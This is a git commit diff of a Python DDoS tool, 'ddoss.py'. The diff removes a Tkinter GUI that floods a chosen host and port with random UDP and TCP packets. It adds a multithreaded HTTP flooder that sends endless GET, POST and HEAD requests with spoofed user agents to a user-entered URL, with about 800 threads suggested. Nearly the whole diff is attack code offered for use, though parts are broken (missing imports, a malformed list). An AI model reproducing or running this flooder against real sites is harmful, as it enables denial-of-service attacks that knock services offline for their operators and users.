bb6ec7a66727cc6d6583cb9623d349a30434f9a4
nik-68 <106348996+nik-68@users.noreply.github.com>
2022-08-08 17:37:35 +0300

    Update ddoss.py

--- ddoss.py
+++ ddoss.py
@@ -1,10 +1,13 @@
 import random
 import socket
 import threading
+import time
 import os,sys
 from secrets import choice
 import psutil
-
+os.system("clear")
+print("З А Г Р У З К А....")
+time.sleep(2.5)
 os.system("clear")
 print('''
     KAZUYA AND TEAM
@@ -19,84 +22,42 @@ print('''
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯
                                 
 ''')
-print("Tools By Kazuya")
-print("Target IP: => ")
-print("Target Port: => ")
+print("Ddos@Attaka")
+
+users = [
+    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3"
+    "Mozilla / 5.0 (Macintosh; Intel Mac OS X 10.14; rv: 75.0) Gecko / 20100101 Firefox / 75.0"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+]
+headers = {
+    'User-Agent' : random.choice(users)
+}
+time.sleep(2.5)
+os.system("clear")
+
+url = input("Ссылка: => ")
+threads = int(input("Потоки (~800 лучше): => "))
+
+payload = {
+    'namest': 'username',
+    'passwordst': 'password',
+}
+def send():
+    while True:
+        requests.get(url, headers=headers, data=payload)
+        print("Get...")
+        requests.post(url, headers=headers, data=payload)
+        print("post...")
+        requests.head(url, headers=headers, data=payload)
+        print("head...")
+
+if __name__ == '__main__':
+    for i in range (threads):
+        thr = Thread(target=send)
+        thr.start()
 
 
 def attack(event):
     for y in range(int(Entry5.get())):
         th = threading.Thread(target = run)
         th.start()
-        
-def tcpattack(eventb):
-	data = random._urandom(1024)
-	while True:
-		cpu = psutil.cpu_percent(interval=1)
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect((str(Entry1.get()) ,int(Entry2.get())))
-			s.send(data)
-			for x in range(Entry4.get()):
-				s.send(data)
-			print(" Sent!!!"+" cpu使用率:"+str(cpu))
-		except:
-			s.close()
-			print("Error!!!"+" cpu使用率:"+str(cpu))
-        
-def run():
-	data = random._urandom(1024)
-	i = random.choice(("[*]","[!]","[#]"))
-	while True:
-		cpu = psutil.cpu_percent(interval=1)
-		try:
-			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-			addr = (str(Entry1.get()),int(Entry2.get()))
-			for x in range(Entry4.get()):
-				s.sendto(data,addr)
-				
-			print("Sent!!!"+" cpu使用率:"+str(cpu))
-		except:
-			print("Error!!!"+" cpu使用率:"+str(cpu))
-
-
-
-app = tk.Tk()
-app.title("Rocket ver.0.0.2")
-
-app.resizable(width=False, height=False)
-
-Static1 = tk.Label(text=u'▼ホストかIP▼')
-Static1.pack()
-
-# Entryを出現させる
-Entry1 = tk.Entry()
-Entry1.pack()
-
-Static2 = tk.Label(text=u'▼ポート▼')
-Static2.pack()
-
-Entry2 = tk.Entry()
-Entry2.pack()
-
-Static4 = tk.Label(text=u'▼1接続あたりのパケット数▼')
-Static4.pack()
-
-Entry4 = tk.Entry()
-Entry4.pack()
-
-Static5 = tk.Label(text=u'▼スレッド数▼')
-Static5.pack()
-
-Entry5 = tk.Entry()
-Entry5.pack()
-
-Button1 = tk.Button(text=u'発射(UDP)', width=50)
-Button1.bind("<Button-1>", attack)        # ボタンが押されたときに実行される関数をバインドします
-Button1.pack()
-
-Button2 = tk.Button(text=u'発射（TCP)', width=50)
-Button2.bind("<Button-2>", tcpattack)
-Button2.pack()
-
-app.mainloop()
